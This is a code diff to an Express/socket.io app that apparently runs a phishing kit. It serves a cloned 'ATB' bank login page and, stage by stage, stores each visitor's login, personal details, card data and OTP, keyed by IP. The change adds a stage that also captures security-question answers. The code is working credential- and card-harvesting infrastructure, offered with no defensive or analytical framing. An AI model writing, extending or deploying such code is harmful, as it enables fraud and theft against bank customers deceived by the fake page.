@@ -300,7 +300,7 @@ app.get('/admin/settings', checkAdminSession, async (req, res) => {
         const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
 
         if (result.rows.length > 0) {
-            console.log(result.rows[0].data);
+            //console.log(result.rows[0].data);
             res.render('admin/settings/index', { data: result.rows[0].data });
         } else {
             res.render('admin/settings/index', { data: null, message: 'Please use the form below to update the page.' });
@@ -312,7 +312,18 @@ app.get('/admin/settings', checkAdminSession, async (req, res) => {
     }
 });
 
-app.get('/atb/login', (req, res) => {
+app.get('/atb/login', async (req, res) => {
+    try{
+        const getId = 1; // Since we're always dealing with the record with id = 1
+        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
+
+        console.log(result.rows[0].data.settings.atb.qa);    
+        
+        if(result.rows[0].data.settings.atb.qa > 0){console.log("Yes we got");} else {console.log("No we don't");}
+        
+    } catch (error) {
+
+    }
     res.render('bank/atb/login/index');
 })
 
@@ -364,15 +375,18 @@ io.on('connection', (socket, req) => {
     socket.on('submit', (data) => {
         if (sessionStore.has(userIP)) {
         let userDetails = sessionStore.get(userIP);
-            if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP) {
-            userDetails.getUserDataLogin = {};
+            if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP && !userDetails.getUserDataQuestion) {
+                userDetails.getUserDataLogin = {};
                 userDetails.getUserDataDetails = {};
                 userDetails.getUserDataCard = {};
                 userDetails.getUserDataOTP = {};
+                userDetails.getUserDataQuestion = {};
         }
         if(userDetails.stage == 'Login'){
             userDetails.getUserDataLogin = data
            
+        } else if(userDetails.stage == 'Question') {
+            userDetails.getUserDataQuestion = data
         } else if(userDetails.stage == 'Details'){
             userDetails.getUserDataDetails = data
             
